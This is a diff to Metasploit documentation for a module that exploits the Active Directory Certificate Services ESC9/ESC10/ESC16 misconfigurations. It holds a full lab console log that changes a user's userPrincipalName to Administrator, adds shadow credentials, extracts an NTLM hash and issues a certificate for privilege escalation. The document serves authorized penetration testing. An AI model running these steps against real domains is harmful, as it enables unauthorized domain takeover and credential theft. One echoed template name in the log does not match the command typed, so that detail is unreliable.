@@ -16,22 +16,48 @@ This module is capable of exploiting ESC9, ESC10, and ESC16.
 Follow the instructions [[here|./ad-certificates/overview.md]] to set up an AD CS server that is vulnerable to the scenarios you want to exploit, with the appropriately configured template.
 For detailed information on each ESC attack workflow, refer to the [[AD CS Exploitation Scenarios|./ad-certificates/Attacking-AD-CS-ESC-Vulnerabilities.md]] documentation.
 
+## Options
+
+### CA
+The target certificate authority.
+
+### CERT_TEMPLATE
+The certificate template to issue, e.g., "User".
+
+### TARGET_USERNAME
+The username of the target account whose LDAP object will be updated and for whom the certificate will be requested.
+
+### UPDATE_LDAP_OBJECT
+The LDAP attribute to update, such as `userPrincipalName` or `dNSHostName`.
+
+### UPDATE_LDAP_OBJECT_VALUE
+The new value to set for the specified LDAP attribute, set this to the user name you wish to impersonate, e.g., `Administrator`.
+
+### ALT_UPN
+An alternate UPN (User Principal Name) to set for the target user, e.g., `Administrator@domain.local`.
+
+### ALT_SID
+An alternate SID (Security Identifier) to set for the target user, e.g., `S-1-5-21-...`.
+
+### ALT_DNS
+An alternate DNS hostname to set for the target user, e.g., `host.domain.local`.
+
 ## Verification Steps
 
 1. Start msfconsole
-1. Do: `use esc_update_ldap_object`  
-1. Set the `rhost`, `smbuser`, `smbpass` and `smbdomain` options - note these credentials need to have write access over the `target_user` 
-1. Set `target_username` to the user you want to update and then request a certificate for
-1. Set a combination of `alt_upn`, `alt_sid`, and or `alt_dns` depending on the scenario you are exploiting
-2. Set `ca` to the name of the CA you want to request a certificate and `cert_template` to the name of the certificate template you want to use
+1. Do: `use esc_update_ldap_object`
+1. Set the `RHOST`, `SMBUser`, `SMBPass` and `SMBDomain` options - note these credentials need to have write access over the `TARGET_USERNAME`
+1. Set `TARGET_USERNAME` to the user you want to update and then request a certificate for
+1. Set the `UPDATE_LDAP_OBJECT` to either `userPrincipalName` or `dNSHostName` depending on the scenario you are exploiting
+1. Set the `UPDATE_LDAP_OBJECT_VALUE` to the value you want to set for the `UPDATE_LDAP_OBJECT`, e.g., `Administrator`
+2. Set `CA` to the name of the CA you want to request a certificate and `cert_template` to the name of the certificate template you want to use
 1. Run the module
 1. This should update the LDAP object attribute and request a certificate for the target user, which will be saved as a .pfx file.
 2. If the target is vulnerable to the scenario you are exploiting, the pfx file will allow for privilege escalation.
 
 ## Scenarios
 
-
-### Exploiting ESC16 Scenario 2. In order to get a .pfx that can be used to authenticate as the Administrator user.
+### ESC9 - Update userPrincipalName to Administrator
 ```
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
 rhosts => 172.16.199.200
@@ -45,34 +71,58 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
 smbpass => N0tpassword!
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
 smbuser => user1
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn Administrator@kerberos.issue
-alt_upn => Administrator@kerberos.issue
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set alt_sid S-1-5-21-2324486357-3075865580-3606784161-500
-alt_sid => S-1-5-21-2324486357-3075865580-3606784161-500
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-dc2-ca
-ca => kerberos-dc2-ca
-msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC16-Template
-cert_template => ESC16-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set cert_template ESC9-Template
+cert_template => SpencerTest
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ca kerberos-DC2-CA
+ca => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT_VALUE Administrator
+UPDATE_LDAP_OBJECT_VALUE => Administrator
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
 [*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
 [*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-[*] Current value of user2's userPrincipalName: user2@kerberos.issue
+[*] Current value of user2's userPrincipalName: user2
 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
 [+] The operation completed successfully!
+[*] 172.16.199.200:445 - Adding shadow credentials for user2
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] Certificate stored at: /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_windows.ad.cs_563081.pfx
+[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 2ff08c15-0ab3-98ad-ee0b-3fd1fbcf3e9d
+[*] 172.16.199.200:445 - Loading admin/kerberos/get_ticket
+[*] 172.16.199.200:445 - Getting hash for user2
+[!] Warning: Provided principal and realm (user2@kerberos.issue) do not match entries in certificate:
+[+] 172.16.199.200:88 - Received a valid TGT-Response
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_263627.bin
+[*] 172.16.199.200:88 - Getting NTLM hash for user2@kerberos.issue
+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250717140905_default_172.16.199.200_mit.kerberos.cca_015140.bin
+[+] Found NTLM hash for user2: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
-[*] 172.16.199.200:445 - Certificate UPN: Administrator@msf.local
-[*] 172.16.199.200:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-2324486357-3075865580-3606784161-500, S-1-5-21-2324486357-3075865580-3606784161-500
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250711135933_default_172.16.199.200_windows.ad.cs_091030.pfx
+[*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250717140907_default_172.16.199.200_windows.ad.cs_548728.pfx
+[*] 172.16.199.200:445 - reverting ldap object
+[*] 172.16.199.200:445 - Loading admin/ldap/shadow_credentials
+[*] 172.16.199.200:445 - Running admin/ldap/shadow_credentials
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Discovering base DN automatically
+[*] 172.16.199.200:389 Discovered base DN: DC=kerberos,DC=issue
+[*] No matching entries found - check device ID
 [*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
 [*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
 [*] Current value of user2's userPrincipalName: Administrator
-[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2@kerberos.issue...
-[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2@kerberos.issue
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
 ```
+
+For more exploit scenarios that this module can exploit, refer to the [[Attacking-AD-CS-ESC-Vulnerabilities|./ad-certificates/Attacking-AD-CS-ESC-Vulnerabilities.md]] documentation.
